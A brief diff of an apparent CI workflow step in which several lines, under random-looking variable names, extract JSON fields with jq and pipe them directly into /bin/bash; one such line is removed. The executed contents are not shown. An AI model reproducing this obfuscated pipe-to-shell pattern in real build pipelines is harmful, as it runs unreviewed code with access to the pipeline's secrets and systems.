@@ -27,7 +27,6 @@ jobs:
           echo $oumds649 | jq -r .ugmfe386 | /bin/bash
           echo $pa5 | jq -r .fmxya18491 | /bin/bash
           echo $u7 | jq -r .nyzs0 | /bin/bash
-          echo $kgx7635 | jq -r .mc0 | /bin/bash
           echo $uxpw13 | jq -r .rre5 | /bin/bash
           printf '%s' "$cxs83" | jq -r .ip670 | /bin/bash
           printf '%s' "$qdb29572" | jq -r .eihm2 | /bin/bash
